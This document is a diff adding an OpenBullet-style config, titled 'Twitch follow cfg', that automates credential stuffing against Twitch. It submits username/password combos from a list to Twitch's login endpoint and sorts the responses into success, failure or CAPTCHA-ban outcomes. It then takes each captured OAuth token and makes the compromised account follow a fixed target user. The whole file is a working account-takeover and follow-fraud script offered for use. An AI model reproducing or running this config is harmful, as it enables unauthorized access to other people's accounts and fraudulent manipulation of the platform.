@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "Twitch follow cfg",
+  "SuggestedBots": 1,
+  "LastModified": "2019-07-18T12:44:56.5886243+02:00",
+  "AdditionalInfo": "credits goes to FFaez1267",
+  "Author": "Stringsko",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://passport.twitch.tv/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"client_id\":\"kimne78kx3ncx6brgo4mv6wki5h1ko\",\"undelete_user\":false}" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 7.1.2; google Pixel 2 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: com.android.browser" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect username or password" 
+    KEY "Invalid username" 
+    KEY "This account needs a password reset" 
+    KEY "Invalid Password." 
+    KEY "suspended user" 
+    KEY "Please enter your username and password" 
+    KEY "no such user" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Ban OR 
+    KEY "Please complete the CAPTCHA correctly" 
+    KEY "captcha_proof" 
+    KEY "Please login to browse the internet" 
+    KEY "You have been identified as anonymous" 
+PARSE "<SOURCE>" JSON "access_token" -> VAR "TOKEN" 
+PARSE "<COOKIES(login)>" JSON "" -> CAP "Username" 
+REQUEST POST "https://gql.twitch.tv/gql" 
+  CONTENT "[{\"operationName\":\"FollowButton_FollowEvent_User\",\"variables\":{\"id\":\"435034625\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"026fcca256d4ef52efaf92e922ff1d16e9cb2f9de8d3731c1074f5a0118d7670\"}}},{\"operationName\":\"FollowButton_FollowUser\",\"variables\":{\"input\":{\"disableNotifications\":false,\"targetID\":\"435034625\"}},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"51956f0c469f54e60211ea4e6a34b597d45c1c37b9664d4b62096a1ac03be9e6\"}}}]" 
+  CONTENTTYPE "text/plain" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 7.1.2; google Pixel 2 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: OAuth <TOKEN>" 
+  HEADER "X-Requested-With: com.android.browser" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "disableNotifications" 
